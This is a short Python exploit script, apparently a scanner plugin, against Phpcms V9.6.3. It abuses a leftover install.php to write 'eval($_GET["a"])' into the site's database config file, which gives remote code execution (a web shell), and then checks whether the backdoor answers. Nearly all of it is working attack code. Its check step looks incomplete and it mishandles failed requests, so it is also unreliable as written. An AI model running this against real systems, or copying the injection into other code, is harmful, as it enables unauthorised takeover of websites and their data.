# coding: utf-8
import requests
import re
#Phpcms V9.6.3 install.php 没有即使删除导致的getshell
def poc(url,user_agent,proxy):

    url = url.strip("/")
    exp_url = url  + '/install/install.php?step=installmodule'
    v_url=url+'/caches/configs/database.php'
    header = {'User-Agent': user_agent}

    data={
        'module':'admin',
        'dbport':3306,
        'pconnect':'eval($_GET["a"])'
    }
    try:
        if proxy:
            proxies = {
                "http": "http://%(proxy)s/" % {'proxy': proxy},
                "https": "http://%(proxy)s/" % {'proxy': proxy}
            }
            response = requests.post(exp_url, headers=header,data=data, proxies=proxies)
            response = requests.get(v_url, headers=header, proxies=proxies)
        else:
            response = requests.post(exp_url, headers=header,data=data)
            response = requests.get(v_url, headers=header)
    except Exception as error:
        pass

    if 'PHP Version' in response.text and response.status_code==200:
        return 'Phpcms V9.6.3 - install.php 没有即使删除导致的getshell'


def run(url,logindict,user_agent,proxies):
    result = poc(url,user_agent,proxies)
    return result

